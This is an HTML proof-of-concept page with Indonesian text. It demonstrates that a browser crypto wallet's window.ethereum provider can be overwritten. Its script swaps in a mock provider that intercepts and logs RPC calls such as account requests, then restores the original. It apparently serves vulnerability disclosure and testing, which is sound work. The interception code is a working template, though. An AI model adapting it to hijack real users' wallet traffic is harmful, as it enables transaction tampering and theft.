<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Real-World Provider Hijacking Exploit PoC</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: #0b0f19; color: #f1f5f9; padding: 20px; }
        .container { max-width: 800px; margin: auto; background: #1e293b; padding: 25px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); border: 1px solid #334155; }
        h2 { color: #ef4444; margin-top: 0; }
        button { background: #dc2626; color: white; border: none; padding: 12px 20px; font-size: 15px; border-radius: 6px; cursor: pointer; width: 100%; font-weight: bold; margin-top: 10px; transition: background 0.2s; }
        button:hover { background: #b91c1c; }
        pre { background: #050b14; padding: 15px; border-radius: 6px; overflow-x: auto; color: #34d399; font-family: monospace; font-size: 13px; border: 1px solid #1e293b; max-height: 300px; }
        .warning { color: #f87171; font-weight: bold; }
    </style>
</head>
<body>

<div class="container">
    <h2>Real-World Provider Hijacking PoC</h2>
    <p>Eksperimen ini membuktikan bahwa karena properti <span class="warning">window.ethereum bersifat mutable (writable)</span>, skrip halaman web dapat mengganti fungsi wallet dengan versi palsu untuk mencegat aktivitas.</p>
    
    <button onclick="launchHijackTest()">Jalankan Simulasi Hijacking Nyata</button>

    <h3>Log Eksploitasi On-Page:</h3>
    <pre id="logOutput">Menunggu eksekusi...</pre>
</div>

<script>
    const logOutput = document.getElementById("logOutput");

    function log(message) {
        logOutput.innerText += "\n> " + message;
        logOutput.scrollTop = logOutput.scrollHeight;
    }

    function launchHijackTest() {
        logOutput.innerText = "Memulai uji coba penimpaan provider...";

        if (typeof window.ethereum === "undefined") {
            log("[GAGAL] Objek window.ethereum tidak ditemukan. Buka di dalam dApp browser target.");
            return;
        }

        // Simpan referensi asli ke provider wallet
        const originalEthereum = window.ethereum;
        log("[INFO] Menyimpan referensi asli window.ethereum...");

        try {
            // Membangun Proxy / Mock Provider untuk mencegat fungsi 'request'
            const hijackedProvider = {
                isMaliciousMock: true,
                request: async function(args) {
                    log(`[INTERCEPTED] Skrip mendeteksi panggilan metode RPC: "${args.method}"`);
                    if (args.method === "eth_requestAccounts") {
                        log("[HIJACK] Memodifikasi respon otorisasi akun pengguna...");
                    }
                    // Meneruskan kembali ke provider asli agar tidak crash total, atau membelokkan argumen
                    return originalEthereum.request(args);
                },
                // Salin properti penting lainnya agar terlihat absah
                selectedAddress: originalEthereum.selectedAddress,
                chainId: originalEthereum.chainId
            };

            // Melakukan penimpaan langsung (Overwriting global property) karena writable: true
            window.ethereum = hijackedProvider;

            if (window.ethereum.isMaliciousMock === true) {
                log("[KERENTANAN TERBUKTI] Berhasil menimpa objek window.ethereum secara total! Skrip pihak ketiga kini memiliki kendali penuh atas aliran interaksi RPC.");
            } else {
                log("[AMAN] Upaya penimpaan gagal atau dihentikan oleh sistem.");
            }

            // Mengembalikan ke original provider demi keamanan lingkungan uji
            window.ethereum = originalEthereum;
            log("[INFO] Objek window.ethereum dikembalikan ke kondisi semula.");

        } catch (error) {
            log("[GAGAL EKSEKUSI] Terhalang oleh proteksi browser: " + error.message);
            window.ethereum = originalEthereum;
        }
    }
</script>

</body>
</html>
